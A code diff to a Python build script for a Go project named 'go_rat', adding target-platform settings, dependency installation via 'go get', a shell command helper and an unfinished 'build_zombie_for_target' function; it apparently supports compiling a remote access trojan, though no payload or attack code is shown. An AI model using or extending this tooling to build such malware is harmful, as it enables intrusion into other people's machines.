@@ -31,7 +31,9 @@ sincerely, mr_hai
 """
 TESTING = True
 
-
+################################################################################
+##############                    IMPORTS                      #################
+################################################################################
 import sys,os
 import logging
 import pkgutil
@@ -55,15 +57,31 @@ except ImportError as derp:
 ################################################################################
 ##############                      VARS                       #################
 ################################################################################
-PROJECT_NAME        = "go_rat"
-
-
-dependencies = ["github.com/fatih/color",
-"github.com/hashicorp/mdns",
-"golang.org/x/sys/windows/registry",
-"github.com/shirou/gopsutil/process",
-"github.com/cakturk/go-netstat/netstat",
-"github.com/shirou/gopsutil/disk"]
+PROJECT_NAME         = "go_rat"
+PROJECT_DIRECTORY    = "/home/moop/Desktop/go_rat/"
+# I want to modify some variables in the globals file 
+# so we can compile custom binaries from generic code
+# holding initial critical information
+GLOBALS_FILE     = PROJECT_DIRECTORY
+possible_targets = {"windows": ["386","amd64","arm"],
+                    "linux"  : ["386","amd64","arm","arm64"],
+                    "android": ["386","amd64","arm","arm64"],
+                    "darwin" : ["amd64","arm64"],
+                    }
+# this should be set to the platform you want to build the binary for
+BUILD_TARGET_OS      = "windows"
+BUILD_TARGET_ARCH    = "amd64"
+# set the folloiwing ENV vars to build specific targets
+# otherwise GO compiler defaults to host specs
+env_var_target_os    = os.environ["GOOS"] = BUILD_TARGET_OS
+env_var_target_arch  = os.environ["GOARCH"] = BUILD_TARGET_ARCH
+# add entries as necessary to reflect go.mod file entries
+PROJECT_DEPENDENCIES = ["github.com/fatih/color",
+                        "github.com/hashicorp/mdns",
+                        "golang.org/x/sys/windows/registry",
+                        "github.com/shirou/gopsutil/process",
+                        "github.com/cakturk/go-netstat/netstat",
+                        "github.com/shirou/gopsutil/disk"]
 
 
 LOGLEVEL            = 'DEV_IS_DUMB'
@@ -73,6 +91,9 @@ logging.basicConfig(filename=log_file, format='%(asctime)s %(message)s', filemod
 logger              = logging.getLogger()
 script_cwd          = Path().absolute()
 script_osdir        = Path(__file__).parent.absolute()
+################################################################################
+##############               COLOR PRINTING                    #################
+################################################################################
 
 redprint          = lambda text: print(Fore.RED + ' ' +  text + ' ' + Style.RESET_ALL) if (COLORMEQUALIFIED == True) else print(text)
 blueprint         = lambda text: print(Fore.BLUE + ' ' +  text + ' ' + Style.RESET_ALL) if (COLORMEQUALIFIED == True) else print(text)
@@ -90,6 +111,9 @@ critical_message  = lambda message: logger.critical(yellow_bold_print(message))
 
 is_method          = lambda func: inspect.getmembers(func, predicate=inspect.ismethod)
 
+################################################################################
+##############                 INTERNAL FUNCS                  #################
+################################################################################
 def error_printer(message):
     exc_type, exc_value, exc_tb = sys.exc_info()
     trace = traceback.TracebackException(exc_type, exc_value, exc_tb) 
@@ -109,10 +133,34 @@ def error_printer(message):
     else:
         error_message(message + ''.join(trace.format_exception_only()))
 
+def exec_command(command, blocking = True, shell_env = True):
+    '''Runs a command with subprocess.Popen'''
+    try:
+        if blocking == True:
+            step = subprocess.Popen(command,shell=shell_env,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            output, error = step.communicate()
+            for output_line in output.decode().split('\n'):
+                info_message(output_line)
+            for error_lines in error.decode().split('\n'):
+                critical_message(error_lines)
+        elif blocking == False:
+            # TODO: not implemented yet                
+            pass
+    except Exception:
+        error_printer("[-] Interpreter Message: exec_command() failed!")
+
+################################################################################
+##############                 MEAT N TATERS                   #################
+################################################################################
 # PYTHON3 script to initialize a new project with the go_rat module
 def init_project():
     '''Initializes the folder this script resides in as a go project'''
-    os.chdir("~/Desktop/{}".format(PROJECT_DIRECTORY))
+    os.chdir(PROJECT_DIRECTORY)
     subprocess.Popen("go mod init {}".format(PROJECT_NAME))
 
-def install_dependencies():
+def install_dependencies(utility_to_use = "go get"):
+    if utility_to_use == "go get":
+        for dependency_url in PROJECT_DEPENDENCIES:
+            exec_command("go get {}".format(dependency_url))
+
+def build_zombie_for_target()
